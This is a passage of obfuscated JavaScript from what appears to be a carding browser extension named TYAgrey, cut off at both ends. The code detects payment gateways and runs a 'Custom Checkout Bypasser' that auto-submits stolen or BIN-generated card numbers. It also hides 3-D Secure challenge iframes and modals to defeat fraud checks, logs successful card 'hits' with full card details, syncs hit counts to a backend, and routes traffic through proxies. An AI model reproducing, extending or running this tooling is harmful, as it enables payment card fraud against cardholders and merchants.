    if (_0x50f88a.includes("adyen") || _0x420c13.includes("adyen") || _0x420c13.includes("Adyen") || _0x420c13.includes("checkoutshopper")) {
      return "adyen";
    }
    if (_0x50f88a.includes("checkout.com") || _0x420c13.includes("checkout.com") || _0x420c13.includes("cko")) {
      return "checkout";
    }
    if (_0x50f88a.includes("recurly") || _0x420c13.includes("recurly") || _0x420c13.includes("Recurly")) {
      return "recurly";
    }
    if (_0x50f88a.includes("xsolla") || _0x420c13.includes("xsolla") || _0x420c13.includes("Xsolla")) {
      return "xsolla";
    }
    if (_0x420c13.includes("woocommerce") || _0x420c13.includes("wc-") || _0x420c13.includes("WooCommerce")) {
      return "woocommerce";
    }
    if (_0x420c13.includes("braintree") || _0x420c13.includes("Braintree") || _0x420c13.includes("bt-")) {
      return "braintree";
    }
    if (_0x420c13.includes("square") || _0x420c13.includes("Square") || _0x420c13.includes("sq-")) {
      return "square";
    }
    if (_0x420c13.includes("paypal") || _0x420c13.includes("PayPal") || _0x420c13.includes("paypal-button")) {
      return "paypal";
    }
    if (_0x420c13.includes("safkey") || _0x420c13.includes("SafeKey") || _0x420c13.includes("americanexpress")) {
      return "amex";
    }
    return "stripe";
  }
  let threeDSObserver = null;
  function init3DSObserver() {
    if (threeDSObserver) {
      return;
    }
    threeDSObserver = new MutationObserver(function (_0x55bcbd) {
      _0x55bcbd.forEach(function (_0x48ebad) {
        _0x48ebad.addedNodes.forEach(function (_0x131258) {
          if (_0x131258.nodeType === 1) {
            if (_0x131258.tagName === "IFRAME") {
              const _0x5d5cb9 = _0x131258.src || "";
              const _0x43c05a = _0x5d5cb9.toLowerCase();
              if (_0x43c05a.includes("3ds") || _0x43c05a.includes("challenge") || _0x43c05a.includes("acs") || _0x43c05a.includes("safkey")) {
                console.log("[TYAgrey][3DS] Blocked dynamically loaded 3DS iframe:", _0x5d5cb9);
                _0x131258.style.display = "none";
                _0x131258.style.visibility = "hidden";
                _0x131258.style.opacity = "0";
                _0x131258.style.position = "absolute";
                _0x131258.style.left = "-9999px";
              }
            }
            if (_0x131258.classList) {
              const _0x333ff5 = _0x131258.className || "";
              const _0x1c2337 = typeof _0x333ff5 === "string" ? _0x333ff5.toLowerCase() : "";
              const _0x3555bb = _0x131258.id || "";
              const _0x28ef23 = _0x3555bb.toLowerCase();
              if (_0x1c2337.includes("3ds") || _0x1c2337.includes("challenge") || _0x1c2337.includes("safkey") || _0x28ef23.includes("3ds") || _0x28ef23.includes("challenge") || _0x28ef23.includes("safkey")) {
                console.log("[TYAgrey][3DS] Hidden dynamically loaded 3DS modal:", _0x333ff5 || _0x3555bb);
                _0x131258.style.display = "none";
                _0x131258.style.visibility = "hidden";
              }
            }
            const _0x3ab1b3 = _0x131258.querySelectorAll ? _0x131258.querySelectorAll("iframe") : [];
            _0x3ab1b3.forEach(_0xf9b227 => {
              const _0x461691 = _0xf9b227.src || "";
              const _0x29c78c = _0x461691.toLowerCase();
              if (_0x29c78c.includes("3ds") || _0x29c78c.includes("challenge") || _0x29c78c.includes("acs") || _0x29c78c.includes("safkey")) {
                console.log("[TYAgrey][3DS] Blocked nested 3DS iframe:", _0x461691);
                _0xf9b227.style.display = "none";
                _0xf9b227.style.visibility = "hidden";
                _0xf9b227.style.opacity = "0";
                _0xf9b227.style.position = "absolute";
                _0xf9b227.style.left = "-9999px";
              }
            });
          }
        });
      });
    });
    threeDSObserver.observe(document.body || document.documentElement, {
      childList: true,
      subtree: true
    });
    console.log("[TYAgrey][3DS] MutationObserver initialized for dynamic 3DS detection");
  }
  function stop3DSObserver() {
    if (threeDSObserver) {
      threeDSObserver.disconnect();
      threeDSObserver = null;
      console.log("[TYAgrey][3DS] MutationObserver stopped");
    }
  }
  function detectGateway() {
    const _0x171149 = window.location.hostname || "";
    if (_0x171149.includes("stripe")) {
      return "stripe";
    }
    const _0x1e64fc = document.body ? document.body.innerHTML.substring(0, 5000) : "";
    if (_0x1e64fc.includes("stripe") || _0x1e64fc.includes("Stripe")) {
      return "stripe";
    }
    if (_0x1e64fc.includes("adyen") || _0x1e64fc.includes("Adyen")) {
      return "adyen";
    }
    if (_0x1e64fc.includes("checkout.com") || _0x1e64fc.includes("Checkout")) {
      return "checkout";
    }
    if (_0x1e64fc.includes("recurly")) {
      return "recurly";
    }
    if (_0x1e64fc.includes("xsolla")) {
      return "xsolla";
    }
    return "stripe";
  }
  function isGatewayEnabled(_0x3b1e2a, _0x14f0e2) {
    if (!_0x14f0e2) {
      return true;
    }
    return _0x14f0e2[_0x3b1e2a] !== false;
  }
  function startCustomCheckoutAutomation(_0xdb7c0d, _0x154686, _0x420ee3, _0x55ee8e) {
    if (isAutoSubmitting) {
      stopAutoSubmit();
    }
    refreshUserRole();
    const _0x34eba3 = localStorage.getItem(K.TOKEN) || "";
    const _0x163967 = localStorage.getItem(K.USER_ID) || "";
    const _0x1f1b1e = localStorage.getItem(K.FIRST_NAME) || "";
    const _0x56fcd6 = localStorage.getItem(K.CHAT_ID) || "";
    if (_0x34eba3 && _0x34eba3.length === 6) {
      savedToken = _0x34eba3;
      userId = _0x163967;
      userFirstName = _0x1f1b1e;
      userChatId = _0x56fcd6;
      savedId = _0x163967;
      isLoggedIn = true;
    }
    customCheckoutActive = true;
    customCheckoutSettings = _0xdb7c0d || {};
    customCheckoutOriginalMode = currentMode;
    customCheckoutOriginalCcList = ccList.slice();
    customCheckoutCurrentCcIndex = 0;
    if (_0x55ee8e === "ccList" && _0x420ee3 && _0x420ee3.length > 0) {
      currentMode = "cc";
      ccList = _0x420ee3.slice();
      currentCCIndex = 0;
      customCheckoutCcList = _0x420ee3.slice();
    } else if (_0x154686 && _0x154686.trim()) {
      currentMode = "bin";
      const _0x3a143b = _0x154686.trim();
      if (savedBINs.length === 0 || !savedBINs.includes(_0x3a143b)) {
        savedBINs.unshift(_0x3a143b);
      }
      localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs.slice(0, 20)));
      localStorage.setItem(K.PANEL_QUICK_BINS, JSON.stringify([_0x3a143b]));
      const _0x20d572 = document.getElementById("binInput1");
      if (_0x20d572) {
        _0x20d572.value = _0x3a143b;
      }
      updateBinStatus();
    }
    applySecurityBypasses();
    const _0x5906c2 = document.querySelector(".cc-info");
    if (_0x5906c2 && _0x55ee8e === "ccList") {
      _0x5906c2.textContent = "0/" + ccList.length + " used";
    }
    startAutoSubmit();
    showWarning("Custom Checkout Bypasser started", "success");
    console.log("[TYAgrey][CustomCheckout][inject] Automation started", {
      mode: _0x55ee8e,
      bin: _0x154686,
      ccCount: ccList.length
    });
  }
  function stopCustomCheckoutAutomation() {
    stopAutoSubmit();
    stop3DSObserver();
    customCheckoutActive = false;
    if (customCheckoutOriginalMode !== null) {
      currentMode = customCheckoutOriginalMode;
    }
    if (customCheckoutOriginalCcList !== null) {
      ccList = customCheckoutOriginalCcList;
    }
    customCheckoutSettings = null;
    customCheckoutCurrentCcIndex = 0;
    customCheckoutCcList = [];
    showWarning("Custom Checkout Bypasser stopped", "info");
    console.log("[TYAgrey][CustomCheckout][inject] Automation stopped");
    if (hasHit) {
      try {
        if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
          chrome.runtime.sendMessage({
            type: "CUSTOM_CHECKOUT_AUTO_STOP"
          }).catch(() => {});
        }
        window.postMessage({
          type: "CUSTOM_CHECKOUT_AUTO_STOP"
        }, "*");
      } catch (_0x494654) {}
    }
  }
  function toggleCollapsible(_0x63ecb6, _0x53dcc9) {
    const _0x34388b = document.getElementById(_0x63ecb6);
    const _0x3de9e3 = _0x53dcc9.querySelector(".collapse-icon");
    if (_0x34388b.classList.contains("open")) {
      _0x34388b.classList.remove("open");
      _0x3de9e3.textContent = "▼";
    } else {
      _0x34388b.classList.add("open");
      _0x3de9e3.textContent = "▲";
    }
  }
  function addToHistory(_0x5762d3, _0x5a4b15, _0x10506f, _0x53f792, _0x1388e8) {
    let _0x2698ef = window.location.hostname || "N/A";
    if (extractedPaymentData.businessUrl) {
      try {
        _0x2698ef = new URL(extractedPaymentData.businessUrl).hostname;
      } catch (_0x2a1575) {
        _0x2698ef = extractedPaymentData.businessUrl;
      }
    } else if (extractedPaymentData.successUrl) {
      try {
        _0x2698ef = new URL(extractedPaymentData.successUrl).hostname;
      } catch (_0x31f499) {}
    }
    const _0x1cbc68 = {
      card: _0x5762d3 + "|" + _0x5a4b15 + "|" + _0x10506f + "|" + _0x53f792,
      response: _0x1388e8,
      time: new Date().toLocaleString("en-US", {
        month: "2-digit",
        day: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false
      }),
      site: _0x2698ef
    };
    cardHistory.unshift(_0x1cbc68);
    saveCardHistory();
    updateHistoryDisplay();
    updateStats();
  }
  function updateHistoryDisplay() {
    const _0xce2e9c = document.getElementById("historyList");
    if (!_0xce2e9c) {
      return;
    }
    if (cardHistory.length === 0) {
      _0xce2e9c.innerHTML = "<div class=\"history-empty\">No hits yet</div>";
      return;
    }
    _0xce2e9c.innerHTML = cardHistory.map((_0x2f125c, _0x3aac46) => "\n    <div class=\"history-item " + (_0x2f125c.response === "SUCCESS" ? "success" : "error") + "\">\n      <div class=\"history-main\">\n        <div class=\"history-card-line\">\n          <span class=\"history-card\">" + _0x2f125c.card + "</span>\n          <button class=\"history-copy\" data-card=\"" + _0x2f125c.card + "\" data-index=\"" + _0x3aac46 + "\">📋</button>\n        </div>\n        <div class=\"history-site\">" + (_0x2f125c.site || "N/A") + "</div>\n        <div class=\"history-meta\">\n          <span class=\"history-response\">" + _0x2f125c.response + "</span>\n          <span class=\"history-time\">" + (_0x2f125c.time || "") + "</span>\n        </div>\n      </div>\n    </div>\n  ").join("");
    _0xce2e9c.querySelectorAll(".history-copy").forEach(_0xf8b5fc => {
      _0xf8b5fc.addEventListener("click", function () {
        const _0x30bb3b = this.getAttribute("data-card");
        if (_0x30bb3b) {
          navigator.clipboard.writeText(_0x30bb3b).then(() => {
            this.textContent = "✓";
            setTimeout(() => {
              this.textContent = "📋";
            }, 1000);
          }).catch(() => {
            window.postMessage({
              type: "COPY_TO_CLIPBOARD_TEXT",
              text: _0x30bb3b
            }, "*");
            this.textContent = "✓";
            setTimeout(() => {
              this.textContent = "📋";
            }, 1000);
          });
        }
      });
    });
  }
  function updateStats(_0x2ff8be, _0x5e9b04) {
    const _0x5555d6 = document.getElementById("statAttempts");
    const _0x342bda = document.getElementById("statSuccess");
    const _0x5c82e0 = _0x2ff8be !== undefined ? _0x2ff8be : attemptCount;
    const _0x14973a = _0x5e9b04 !== undefined ? _0x5e9b04 : cardHistory.filter(_0x4dcaec => _0x4dcaec.response === "SUCCESS").length;
    if (_0x5555d6) {
      _0x5555d6.textContent = _0x5c82e0;
    }
    if (_0x342bda) {
      _0x342bda.textContent = _0x14973a;
    }
  }
  window.addEventListener("message", _0x5def35 => {
    if (_0x5def35.source !== window) {
      return;
    }
    switch (_0x5def35.data.type) {
      case "UPDATE_SAVED_BIN":
        if (_0x5def35.data.bin) {
          if (savedBINs.length === 0) {
            savedBINs = [_0x5def35.data.bin];
          }
          const _0x5e681f = document.getElementById("binInput1");
          if (_0x5e681f && !_0x5e681f.value) {
            _0x5e681f.value = _0x5def35.data.bin;
          }
          updateBinStatus();
        }
        break;
      case "UPDATE_SAVED_ID":
        if (_0x5def35.data.id) {
          savedId = _0x5def35.data.id;
          updateIdStatus();
        }
        break;
      case "UPDATE_TOGGLE_STATES":
        break;
      case "UPDATE_LOGIN_STATE":
        if (_0x5def35.data.userId && _0x5def35.data.token && !isLoggedIn) {
          userId = _0x5def35.data.userId || "";
          userFirstName = _0x5def35.data.firstName || "";
          const _0x352957 = _0x5def35.data.token || "";
          isLoggedIn = true;
          if (_0x352957) {
            localStorage.setItem("tyagrey_token", _0x352957);
          }
          if (userId) {
            localStorage.setItem("tyagrey_user_id", userId);
          }
          if (userFirstName) {
            localStorage.setItem("tyagrey_first_name", userFirstName);
          }
          if (!document.getElementById("tyagrey-new-overlay") && isPaymentPage()) {
            try {
              createTYAgreyOverlay();
            } catch (_0x3d218a) {}
          }
          const _0x4d263d = document.getElementById("loginScreen");
          const _0x47db94 = document.getElementById("mainDashboard");
          if (_0x4d263d) {
            _0x4d263d.classList.add("hidden");
          }
          if (_0x47db94) {
            _0x47db94.classList.remove("hidden");
          }
          updateIpBarUserInfo();
          startHitCountsRefresh();
          startPeriodicCloudSync();
          fetchDailyHits();
        }
        break;
      case "PROXY_CLEARED_FROM_POPUP":
        proxyString = "";
        localStorage.removeItem(K.PROXY_STRING);
        localStorage.removeItem(K.PROXY_ENABLED);
        const _0x43414e = document.getElementById("proxyViewBtn");
        if (_0x43414e) {
          _0x43414e.textContent = "Set";
        }
        showWarning("Proxy cleared", "info");
        break;
      case "CUSTOM_CHECKOUT_START_INJECT":
        {
          const _0x1aaacd = _0x5def35.data.settings || {};
          const _0x2aee45 = _0x5def35.data.bin || "";
          const _0x881d2a = _0x5def35.data.ccList || "";
          const _0x9e5a6f = _0x5def35.data.mode || "bin";
          let _0x54a46a = [];
          if (_0x9e5a6f === "ccList" && _0x881d2a) {
            _0x54a46a = parseCustomCheckoutCCList(_0x881d2a);
          }
          startCustomCheckoutAutomation(_0x1aaacd, _0x2aee45, _0x54a46a, _0x9e5a6f);
        }
        break;
      case "CUSTOM_CHECKOUT_STOP_INJECT":
        stopCustomCheckoutAutomation();
        break;
    }
  });
  function createTYAgreyDashboard() {}
  function updateTYAgreyDashboard() {
    const _0x4280da = document.getElementById("bar-personal-hits");
    const _0x38c8ac = document.getElementById("bar-global-hits");
    const _0x3957cf = document.getElementById("bar-ip-value");
    const _0x2a6095 = document.getElementById("bar-ip-dot");
    const _0x5ed3f3 = document.querySelector(".stats-username");
    if (_0x4280da) {
      const _0x4561a6 = localStorage.getItem(K.TOKEN);
      if (_0x4561a6) {
        apiFetch("get-user-data", {
          token: _0x4561a6
        }).then(function (_0x54ef64) {
          if (_0x54ef64.success && typeof _0x54ef64.total_hits === "number") {
            _0x4280da.textContent = _0x54ef64.total_hits;
          }
        }).catch(() => {
          _0x4280da.textContent = userHitsCount;
        });
      } else {
        _0x4280da.textContent = userHitsCount;
      }
    }
    if (_0x38c8ac) {
      const _0x500ec1 = localStorage.getItem(K.TOKEN);
      if (_0x500ec1) {
        apiFetch("validate", {
          token: _0x500ec1
        }).then(function (_0x4e825e) {
          if (_0x4e825e.success && _0x4e825e.global_hits) {
            _0x38c8ac.textContent = _0x4e825e.global_hits;
          }
        }).catch(() => {
          _0x38c8ac.textContent = globalHitsCount;
        });
      } else {
        _0x38c8ac.textContent = globalHitsCount;
      }
    }
    if (_0x3957cf) {
      const _0x5c89f4 = _0x3957cf.dataset.revealed === "true";
      if (_0x5c89f4) {
        _0x3957cf.textContent = currentDisplayIp || "Checking...";
        _0x3957cf.classList.add("is-revealed");
        _0x3957cf.title = "Tap to hide IP";
      } else {
        _0x3957cf.textContent = currentDisplayIp ? "***.***.***.***" : "Checking...";
        _0x3957cf.classList.remove("is-revealed");
        _0x3957cf.title = "Tap to reveal IP";
      }
    }
    if (_0x2a6095) {
      _0x2a6095.className = proxyEnabled ? "stats-ip-dot status-active" : "stats-ip-dot status-inactive";
    }
  }
  function drawPfpOnCanvas(_0x4334d9, _0x113d29, _0xe64b6a) {
    if (!_0x4334d9 || _0x4334d9 === DEFAULT_PFP) {
      _0x113d29.style.display = "none";
      _0xe64b6a.style.display = "flex";
      return;
    }
    sendToBackground({
      type: "FETCH_IMAGE",
      url: _0x4334d9
    }).then(_0x3c8bc7 => {
      if (!_0x3c8bc7 || !_0x3c8bc7.success || !_0x3c8bc7.dataUrl) {
        _0x113d29.style.display = "none";
        _0xe64b6a.style.display = "flex";
        return;
      }
      const _0x953ad2 = atob(_0x3c8bc7.dataUrl.split(",")[1]);
      const _0x4282d2 = _0x3c8bc7.dataUrl.split(",")[0].split(":")[1].split(";")[0];
      const _0x1d0247 = new ArrayBuffer(_0x953ad2.length);
      const _0x357672 = new Uint8Array(_0x1d0247);
      for (let _0x17f35c = 0; _0x17f35c < _0x953ad2.length; _0x17f35c++) {
        _0x357672[_0x17f35c] = _0x953ad2.charCodeAt(_0x17f35c);
      }
      const _0x29679f = new Blob([_0x1d0247], {
        type: _0x4282d2
      });
      createImageBitmap(_0x29679f).then(_0x1c2e53 => {
        const _0x1a3c34 = _0x113d29.getContext("2d");
        const _0x54926d = _0x113d29.width;
        _0x1a3c34.clearRect(0, 0, _0x54926d, _0x54926d);
        _0x1a3c34.beginPath();
        _0x1a3c34.arc(_0x54926d / 2, _0x54926d / 2, _0x54926d / 2, 0, Math.PI * 2);
        _0x1a3c34.closePath();
        _0x1a3c34.clip();
        _0x1a3c34.drawImage(_0x1c2e53, 0, 0, _0x54926d, _0x54926d);
        _0x113d29.style.display = "block";
        _0xe64b6a.style.display = "none";
      }).catch(() => {
        _0x113d29.style.display = "none";
        _0xe64b6a.style.display = "flex";
      });
    }).catch(() => {
      _0x113d29.style.display = "none";
      _0xe64b6a.style.display = "flex";
    });
  }
  let currentDisplayIp = "";
  let isIpBlurred = true;
  let ipRevealTimeout = null;
  function createBottomIpBar() {
    if (document.getElementById("tyagrey-bottom-ip-bar")) {
      return;
    }
    const _0x59dac0 = isLoggedIn && userFirstName;
    const _0x2dc4a3 = userPfpUrl || DEFAULT_PFP;
    const _0x3d6ef4 = userFirstName || "User";
    const _0x153059 = _0x3d6ef4.slice(0, 2).toUpperCase();
    const _0xf072aa = document.createElement("div");
    _0xf072aa.id = "tyagrey-bottom-ip-bar";
    _0xf072aa.className = "tyagrey-bottom-ip-bar";
    if (!isLoggedIn) {
      _0xf072aa.style.display = "none";
    }
    const _0xf15e71 = document.createElement("div");
    _0xf15e71.className = "ipbar-user-section";
    _0xf15e71.id = "ipBarUserSection";
    if (!_0x59dac0) {
      _0xf15e71.style.display = "none";
    }
    const _0x113638 = document.createElement("div");
    _0x113638.className = "ipbar-pfp-wrap";
    const _0x41c880 = document.createElement("canvas");
    _0x41c880.id = "ipBarPfpCanvas";
    _0x41c880.width = 72;
    _0x41c880.height = 72;
    _0x41c880.className = "ipbar-pfp-canvas";
    const _0x30ca35 = document.createElement("div");
    _0x30ca35.className = "ipbar-pfp-fallback";
    _0x30ca35.id = "ipBarPfpFallback";
    _0x30ca35.textContent = _0x153059;
    _0x113638.appendChild(_0x41c880);
    _0x113638.appendChild(_0x30ca35);
    if (_0x59dac0 && _0x2dc4a3 && _0x2dc4a3 !== DEFAULT_PFP) {
      drawPfpOnCanvas(_0x2dc4a3, _0x41c880, _0x30ca35);
    } else {
      _0x41c880.style.display = "none";
    }
    const _0x31b980 = document.createElement("div");
    _0x31b980.className = "ipbar-user-meta";
    const _0x19e4bb = document.createElement("span");
    _0x19e4bb.className = "ipbar-username";
    _0x19e4bb.id = "ipBarUsername";
    _0x19e4bb.textContent = _0x3d6ef4;
    const _0x599f26 = document.createElement("span");
    _0x599f26.className = "ipbar-stats";
    const _0x562877 = document.createElement("span");
    _0x562877.className = "ipbar-stat-label";
    _0x562877.textContent = "DAILY:";
    const _0x4e022d = document.createElement("span");
    _0x4e022d.className = "ipbar-stat-val";
    _0x4e022d.id = "ipBarDailyHits";
    _0x4e022d.textContent = "0/5";
    const _0x5e1cfc = document.createElement("span");
    _0x5e1cfc.className = "ipbar-stat-sep";
    _0x5e1cfc.textContent = "|";
    const _0xfb5a32 = document.createElement("span");
    _0xfb5a32.className = "ipbar-stat-label";
    _0xfb5a32.textContent = "HIT:";
    const _0x36efc3 = document.createElement("span");
    _0x36efc3.className = "ipbar-stat-val";
    _0x36efc3.id = "ipBarHits";
    _0x36efc3.textContent = userHitsCount;
    const _0x24f2dd = document.createElement("span");
    _0x24f2dd.className = "ipbar-stat-sep";
    _0x24f2dd.textContent = "|";
    const _0x24a6ae = document.createElement("span");
    _0x24a6ae.className = "ipbar-stat-label";
    _0x24a6ae.textContent = "GLOBAL:";
    const _0x482af4 = document.createElement("span");
    _0x482af4.className = "ipbar-stat-val";
    _0x482af4.id = "ipBarGlobalHits";
    _0x482af4.textContent = globalHitsCount;
    _0x599f26.appendChild(_0x562877);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0x4e022d);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0x5e1cfc);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0xfb5a32);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0x36efc3);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0x24f2dd);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0x24a6ae);
    _0x599f26.appendChild(document.createTextNode(" "));
    _0x599f26.appendChild(_0x482af4);
    _0x31b980.appendChild(_0x19e4bb);
    _0x31b980.appendChild(_0x599f26);
    _0xf15e71.appendChild(_0x113638);
    _0xf15e71.appendChild(_0x31b980);
    const _0x11d078 = document.createElement("div");
    _0x11d078.className = "ipbar-divider";
    _0x11d078.id = "ipBarDivider";
    if (!_0x59dac0) {
      _0x11d078.style.display = "none";
    }
    const _0x28cc0c = document.createElement("div");
    _0x28cc0c.className = "ipbar-ip-section ip-row-clickable";
    _0x28cc0c.id = "ipBarIpRow";
    const _0x15d08e = document.createElement("span");
    _0x15d08e.className = "ipbar-status-dot status-inactive";
    _0x15d08e.id = "ipBarProxyDot";
    const _0x20eacb = document.createElement("span");
    _0x20eacb.className = "ipbar-ip-label";
    _0x20eacb.textContent = "IP:";
    const _0x433152 = document.createElement("span");
    _0x433152.className = "ipbar-ip-value ip-blurred";
    _0x433152.id = "ipBarIpValue";
    _0x433152.textContent = "Loading...";
    _0x28cc0c.appendChild(_0x15d08e);
    _0x28cc0c.appendChild(_0x20eacb);
    _0x28cc0c.appendChild(_0x433152);
    _0xf072aa.appendChild(_0xf15e71);
    _0xf072aa.appendChild(_0x11d078);
    _0xf072aa.appendChild(_0x28cc0c);
    document.body.appendChild(_0xf072aa);
    _0x28cc0c.addEventListener("click", toggleIpReveal);
  }
  async function fetchDailyHits() {
    const _0x303bcb = localStorage.getItem(K.TOKEN);
    if (!_0x303bcb) {
      return;
    }
    try {
      const _0x19bf77 = await sendToBackground({
        type: "API_REQUEST",
        endpoint: "get-user-data",
        payload: {
          token: _0x303bcb
        }
      });
      if (_0x19bf77 && _0x19bf77.success) {
        dailyHitsCount = _0x19bf77.daily_hits || 0;
        dailyHitLimit = _0x19bf77.daily_limit !== undefined ? _0x19bf77.daily_limit : 5;
        if (_0x19bf77.role) {
          userRole = _0x19bf77.role;
          localStorage.setItem("tyagrey_user_role", _0x19bf77.role);
        }
        const _0x362b0c = document.getElementById("ipBarDailyHits");
        if (_0x362b0c) {
          if (userRole === "user") {
            _0x362b0c.textContent = dailyHitsCount + "/" + dailyHitLimit;
          } else {
            _0x362b0c.textContent = "∞";
          }
        }
      }
    } catch (_0x554cf2) {
      console.error("[TYAgrey] Failed to fetch daily hits:", _0x554cf2);
    }
  }
  function updateIpBarUserInfo() {
    const _0xd4c308 = document.getElementById("tyagrey-bottom-ip-bar");
    const _0x5b742c = document.getElementById("ipBarUserSection");
    const _0x229840 = document.getElementById("ipBarDivider");
    const _0x5af0d0 = document.getElementById("ipBarPfpCanvas");
    const _0x43d919 = document.getElementById("ipBarPfpFallback");
    const _0x4046ef = document.getElementById("ipBarUsername");
    const _0x5e642f = document.getElementById("ipBarHits");
    const _0x6ff493 = document.getElementById("ipBarGlobalHits");
    const _0x19861e = document.getElementById("ipBarDailyHits");
    if (!isLoggedIn) {
      if (_0xd4c308) {
        _0xd4c308.style.display = "none";
      }
      return;
    }
    if (_0xd4c308) {
      _0xd4c308.style.display = "flex";
    }
    if (_0x5b742c) {
      _0x5b742c.style.display = "flex";
    }
    if (_0x229840) {
      _0x229840.style.display = "block";
    }
    const _0x504228 = userPfpUrl || DEFAULT_PFP;
    const _0x506db = userFirstName || "User";
    const _0x390075 = _0x506db.slice(0, 2).toUpperCase();
    if (_0x19861e) {
      if (userRole === "user") {
        _0x19861e.textContent = dailyHitsCount + "/" + dailyHitLimit;
        _0x19861e.style.display = "inline";
      } else {
        _0x19861e.textContent = "∞";
        _0x19861e.style.display = "inline";
      }
    }
    if (_0x43d919) {
      _0x43d919.textContent = _0x390075;
    }
    if (_0x5af0d0 && _0x504228 && _0x504228 !== DEFAULT_PFP) {
      _0x5af0d0.style.display = "";
      drawPfpOnCanvas(_0x504228, _0x5af0d0, _0x43d919);
    } else if (_0x5af0d0) {
      _0x5af0d0.style.display = "none";
      if (_0x43d919) {
        _0x43d919.style.display = "flex";
      }
    }
    if (_0x4046ef) {
      _0x4046ef.textContent = _0x506db;
    }
    if (_0x5e642f) {
      _0x5e642f.textContent = userHitsCount;
    }
    if (_0x6ff493) {
      _0x6ff493.textContent = globalHitsCount;
    }
    updateTYAgreyDashboard();
  }
  function toggleIpReveal() {
    const _0x3f555c = document.getElementById("ipBarIpValue");
    if (!_0x3f555c) {
      return;
    }
    if (ipRevealTimeout) {
      clearTimeout(ipRevealTimeout);
      ipRevealTimeout = null;
    }
    if (isIpBlurred) {
      _0x3f555c.classList.remove("ip-blurred");
      _0x3f555c.classList.add("ip-revealed");
      isIpBlurred = false;
      ipRevealTimeout = setTimeout(() => {
        _0x3f555c.classList.remove("ip-revealed");
        _0x3f555c.classList.add("ip-blurred");
        isIpBlurred = true;
      }, 5000);
    } else {
      _0x3f555c.classList.remove("ip-revealed");
      _0x3f555c.classList.add("ip-blurred");
      isIpBlurred = true;
    }
  }
  async function fetchRealIp() {
    try {
      const _0x3cda17 = await sendToBackground({
        type: "FETCH_REAL_IP"
      });
      if (_0x3cda17 && _0x3cda17.ip) {
        currentDisplayIp = _0x3cda17.ip;
        updateBottomIpBar(_0x3cda17.ip, false);
      }
    } catch (_0x5b86c1) {}
  }
  function updateBottomIpBar(_0x64e2d2, _0x28d5f5) {
    const _0x5af787 = document.getElementById("ipBarProxyDot");
    const _0x1dcf10 = document.getElementById("ipBarIpValue");
    if (_0x5af787) {
      _0x5af787.className = _0x28d5f5 ? "ipbar-status-dot status-active" : "ipbar-status-dot status-inactive";
    }
    if (_0x1dcf10 && _0x64e2d2) {
      currentDisplayIp = _0x64e2d2;
      _0x1dcf10.textContent = _0x64e2d2;
      _0x1dcf10.className = isIpBlurred ? "ipbar-ip-value ip-blurred" : "ipbar-ip-value ip-revealed";
    }
    updateIpBarUserInfo();
    updateTYAgreyDashboard();
  }
  function injectEmailBlurStyles() {
    if (document.getElementById("tyagrey-email-blur-style")) {
      return;
    }
    const _0x341a60 = document.createElement("style");
    _0x341a60.id = "tyagrey-email-blur-style";
    _0x341a60.textContent = "\n      body.tyagrey-checkout-active input[type=\"email\"],\n      body.tyagrey-checkout-active input[name*=\"email\" i],\n      body.tyagrey-checkout-active input[autocomplete=\"email\"],\n      body.tyagrey-checkout-active input[id*=\"email\" i],\n      body.tyagrey-checkout-active input[placeholder*=\"email\" i],\n      body.tyagrey-checkout-active input[aria-label*=\"email\" i],\n      body.tyagrey-checkout-active .tyagrey-email-text-blur {\n        filter: blur(5px) !important;\n        -webkit-filter: blur(5px) !important;\n        transition: filter 0.2s ease, -webkit-filter 0.2s ease !important;\n        user-select: none !important;\n        -webkit-user-select: none !important;\n      }\n      body.tyagrey-checkout-active input[type=\"email\"]:hover,\n      body.tyagrey-checkout-active input[type=\"email\"]:focus,\n      body.tyagrey-checkout-active input[type=\"email\"]:active,\n      body.tyagrey-checkout-active input[name*=\"email\" i]:hover,\n      body.tyagrey-checkout-active input[name*=\"email\" i]:focus,\n      body.tyagrey-checkout-active input[name*=\"email\" i]:active,\n      body.tyagrey-checkout-active input[autocomplete=\"email\"]:hover,\n      body.tyagrey-checkout-active input[autocomplete=\"email\"]:focus,\n      body.tyagrey-checkout-active input[autocomplete=\"email\"]:active,\n      body.tyagrey-checkout-active input[id*=\"email\" i]:hover,\n      body.tyagrey-checkout-active input[id*=\"email\" i]:focus,\n      body.tyagrey-checkout-active input[id*=\"email\" i]:active,\n      body.tyagrey-checkout-active input[placeholder*=\"email\" i]:hover,\n      body.tyagrey-checkout-active input[placeholder*=\"email\" i]:focus,\n      body.tyagrey-checkout-active input[placeholder*=\"email\" i]:active,\n      body.tyagrey-checkout-active input[aria-label*=\"email\" i]:hover,\n      body.tyagrey-checkout-active input[aria-label*=\"email\" i]:focus,\n      body.tyagrey-checkout-active input[aria-label*=\"email\" i]:active,\n      body.tyagrey-checkout-active .tyagrey-email-text-blur:hover,\n      body.tyagrey-checkout-active .tyagrey-email-text-blur:active {\n        filter: blur(0px) !important;\n        -webkit-filter: blur(0px) !important;\n        user-select: auto !important;\n        -webkit-user-select: auto !important;\n      }\n    ";
    (document.head || document.documentElement).appendChild(_0x341a60);
  }
  function setupCheckoutEmailBlur() {
    const _0x3f990d = window.location.href.toLowerCase();
    const _0x290a60 = window.location.hostname.toLowerCase();
    const _0x5985c3 = ["checkout", "stripe", "/c/pay/cs_live_", "pay/cs_live_", "cs_live_"];
    const _0x46ac58 = _0x5985c3.some(_0x14e9d0 => _0x3f990d.includes(_0x14e9d0) || _0x290a60.includes(_0x14e9d0));
    if (!_0x46ac58) {
      return;
    }
    document.body.classList.add("tyagrey-checkout-active");
    injectEmailBlurStyles();
    const _0x47576f = /[\w.\-+]+@[\w.\-]+\.\w{2,}/;
    const _0x39df25 = new Set(["SCRIPT", "STYLE", "NOSCRIPT", "INPUT", "TEXTAREA", "SELECT", "BUTTON", "SVG", "PATH", "IMG", "BR", "HR", "IFRAME"]);
    function _0x408627() {
